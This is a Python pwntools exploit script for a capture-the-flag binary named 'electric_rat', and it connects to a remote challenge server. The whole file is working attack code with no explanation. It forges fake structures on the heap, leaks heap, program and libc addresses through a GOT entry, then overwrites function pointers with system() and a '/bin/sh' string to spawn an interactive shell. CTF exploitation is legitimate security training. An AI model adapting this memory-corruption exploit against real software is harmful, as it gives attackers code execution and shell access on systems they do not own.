#!/usr/bin/env python
from pwn import *
from functools import wraps
import itertools

context.log_level = 'error'
e = ELF('./electric_rat')
r = None

def wrap(f):
    @wraps(f)
    def wrapped_f(*args, **kwargs):
        log.info('Called: ' + f.__name__ + repr(args))
        return f(*args, **kwargs)
    return wrapped_f

@wrap
def new_cust(name):
    r.sendline('N')
    r.sendline(name)
    r.recvuntil('Choice: ')

LOCAL = False

def read_menu():
    r.recvuntil("9 -")
    r.recvuntil("\n")



def alloc_unknown(buff):
    read_menu()
    r.sendline("1")
    r.recvuntil("Unknown")
    r.sendline("7")
    r.recvuntil("it!!")
    r.sendline(buff)

def alloc_normal(i):
    assert i >= 0 and i < 7
    read_menu()
    r.sendline("1")
    r.recvuntil("Unknown")
    r.sendline(str(i))

def del_creature(index):
    read_menu()
    r.sendline("2")
    r.recvuntil("Database")
    r.sendline(str(index))

def add_to_party(index):
    read_menu()
    r.sendline("5")
    r.recvuntil("party")
    r.sendline(str(index))
    r.recvuntil("Added")
    res = r.recvuntil("to party")[1:-8]
    return res

def remove_from_party(index):
    read_menu()
    r.sendline("6")
    r.recvuntil(")?")
    r.sendline(str(index))

def equip(party_index, item):
    read_menu()
    r.sendline("8")
    r.recvuntil("?")
    r.sendline(str(party_index))
    r.recvuntil("Hat")
    r.sendline(str(item))

def show_in_db(index):
    read_menu()
    r.sendline("3")
    r.recvuntil("all.")
    r.sendline(str(index))
    res = r.recvuntil("Pick")[:-4]
    return res

def update_creature(index, buff):
    read_menu()
    r.sendline("4")
    r.recvuntil("Database.")
    r.sendline(str(index))
    r.recvuntil("Bagmon!")
    r.sendline(buff)

def build_fake_creature(name, func1, func2):
    creature = "/bin/sh\x00"
    creature += "A" * (0x40 - 12 - len(creature))
    creature += p32(7) #type index
    creature += p64(func1) #func1
    creature += p64(func2) #func2
    creature += p64(name) #name
    creature += p64(1) #int 1
    creature += p64(2) #int 2
    creature += p64(3) #int 3
    creature += p64(4) #field 34
    creature += p64(5) #field 3c
    return creature

# Assumes creature has already been made
def leak_addr(addr):
    fake_creature = build_fake_creature(addr, 0, 0)
    update_creature(0, fake_creature)
    res = add_to_party(1).rstrip()
    remove_from_party(0)
    return res

def main():
    global r
    env = { }
    if LOCAL:
        r = process('./electric_rat', env=env)
        #gdb.attach(r, '''b *0x00005555555557f4
        #c'''.format())
        l = ELF("./local_libc.so")
    else:
        r = remote("challenge.acictf.com", 14004)
        l = ELF("./libc.so")

    LEAK_OFFSET = 0x40 - 12 + 0x34 + 8 + 1

    c = build_fake_creature(0, 0, 0)
    alloc_unknown(c)
    add_to_party(1)
    equip(0, 0)
    leak = show_in_db(0)
    leak = u64(leak[ LEAK_OFFSET : LEAK_OFFSET+8 ])
    heap_base = leak - 0x38
    alloc_base = heap_base + 0x1000
    print("[+] Heap base:", hex(heap_base))
    print("[+] Alloc base:", hex(alloc_base))

    #Clean up from leak
    remove_from_party(0)

    alloc_normal(1)
    creature_base = alloc_base + 0xc0
    creature_func = creature_base + 0x4
    func_addr = u64(leak_addr(creature_func).ljust(8, "\x00"))
    text_base = func_addr - 0x18c4
    print("[+] Text base:", hex(text_base))

    rand_got = e.got["rand"]
    libc_leak = u64(leak_addr(text_base + rand_got).ljust(8, "\x00"))
    libc_base = libc_leak - l.symbols["rand"]
    print("[+] Libc base:", hex(libc_base))
    system_addr = libc_base + l.symbols["system"]
    print("[+] System:", hex(system_addr))
    bin_sh_addr = alloc_base + 0xc
    print("[+] Bin sh at :", hex(bin_sh_addr))

    fake_win = build_fake_creature(bin_sh_addr, system_addr, system_addr)
    update_creature(0, fake_win)
    add_to_party(1)
    r.sendline("9")
    print("#### GOING INTERACTIVE")
    r.interactive()

if __name__ == '__main__':
    main()
